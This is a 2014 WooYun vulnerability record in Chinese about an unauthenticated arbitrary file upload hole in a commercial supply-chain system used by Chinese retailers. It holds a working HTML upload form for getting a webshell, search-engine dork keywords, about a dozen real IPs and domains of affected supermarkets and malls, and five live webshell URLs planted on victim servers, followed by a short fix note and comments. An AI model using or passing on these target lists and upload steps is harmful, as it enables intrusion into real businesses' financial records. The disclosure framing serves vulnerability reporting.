{"id": 53666, "wybug_id": "wooyun-2014-066857", "wybug_title": "某商业链系统通用任意文件上传漏洞,直接Getshell", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "sex is not show", "wybug_date": "2014-07-04 18:19", "wybug_open_date": "2014-10-02 18:20", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件上传"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-07-12：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-09-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-02：\t细节向公众公开  简要描述： 涉及全国多家超市、商场，系统涉及的都是每天的流水账。 上个首页可好~ 详细说明：  技术支持:北京富基融通科技有限公司(http://www.e-future.com.cn/)程序名称：商业供应链系统漏洞类型：任意文件上传导致代码执行是否需要登录：否漏洞文件：/web/epublic/upload.jsp漏洞参数：File1关键字：google & baidu   intitle:商业供应链系统影响用户：可以参看开发公司的案例介绍：http://www.e-future.com.cn/case_market.php个人搜集了些案例：\n北京奥特莱斯SCM商业供应链系统http://123.127.107.117/web/epublic/upload.jsp哈尔滨联强乐买SCM商业供应链系统http://1.58.67.114/web/epublic/upload.jsp北人集团_商业供应链SCM系统-超市http://scm.brjt.cn:8081/web/epublic/upload.jsp国光SCM商业供应链系统http://gyl.jxggls.com:8080/web/epublic/upload.jsp家乐园供应链系统http://222.223.124.193:8081/web/epublic/upload.jsp商业供应链系统http://js.bjcsf.com/web/epublic/upload.jsp商业供应链系统http://218.66.37.70:8081/web/epublic/upload.jsp商业供应链系统http://218.207.88.11/web/epublic/upload.jsp商业供应链系统http://60.2.37.237:8080/web/epublic/upload.jsp沈阳新一城商场经营管理有限公司http://61.161.160.102:8080/web/epublic/upload.jsp新朝阳购物中心网http://60.10.134.176:8080/web/epublic/upload.jsp东方购物广场有限公司SCM系统http://60.213.49.66:8000/web/epublic/upload.jsphttp://221.194.122.150/web/epublic/upload.jsp\n利用方式： 本地构造表单上传，代码如下：\n<!DOCTYPE HTML><html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"><title>UploadiFive Test</title></head><body>\t<form enctype=\"multipart/form-data\" action=\"http://123.127.107.117/web/epublic/upload.jsp\" method=\"post\"><input type=\"file\" name=\"Filedata\" size=\"50\"><br><input type=\"submit\" value=\"Upload\"></form></body></html>\n提交后报错，不管它，直接访问/web/upload/xxx.jsp (xxx.jsp为上传的文件名)   漏洞证明：  实例演示：####1：北京奥特莱斯SCM商业供应链系统http://123.127.107.117/web/epublic/upload.jspshell地址：http://123.127.107.117/web/upload/silicwebshell.jsp\n\n###实例2：哈尔滨联强乐买SCM商业供应链系统http://1.58.67.114/web/epublic/upload.jspshell地址：http://1.58.67.114/web/upload/silicwebshell.jsp\n\n####实例3：北人集团_商业供应链SCM系统-超市http://scm.brjt.cn:8081/web/epublic/upload.jspshell地址：http://scm.brjt.cn:8081/web/upload/silicwebshell.jsp\n\n####实例4：国光SCM商业供应链系统http://gyl.jxggls.com:8080/web/epublic/upload.jspshell地址：http://gyl.jxggls.com:8080/web/upload/silicwebshell.jsp\n\n####实例5：家乐园供应链系统http://222.223.124.193:8081/web/epublic/upload.jspshell地址：http://222.223.124.193:8081/web/upload/silicwebshell.jsp\n\n其他就不一一演示了、方法都一样   修复方案：  权限限制访问，上传文件限定类型   版权声明：转载请注明来源 sex is not show@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-07-09 14:46 厂商回复： CNVD确认并复现所述情况，与上一个漏洞处置情况类似，CNVD电话联系软件生产厂商北京富基融通，***转技术部，对方称不负责相关业务未进行转报，后发网站邮箱：通报。。  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-07-04 18:27 |    \t\tMr.leo \t\t\t( 普通白帽子  |\t\t\t        Rank:1314 漏洞数:176        | 说点神马呢！！)\t\t \n  东西抢不到，上个首页补偿一下吧    \n     2014-07-04 20:16 |    \t\tsex is not show  \t\t\t( 普通白帽子  |\t\t\t        Rank:1495 漏洞数:233        | 这家伙真懒！)\t\t \n  @疯狗 @xsser 上一个商业链的还首页呢，这个怎么不是呢?    \n     2014-07-06 11:41 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  @sex is not show 因为你rank刷的太多了    \n     2014-07-06 22:11 |    \t\tsex is not show  \t\t\t( 普通白帽子  |\t\t\t        Rank:1495 漏洞数:233        | 这家伙真懒！)\t\t \n  @U神 哎，我刷的并不多啊    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}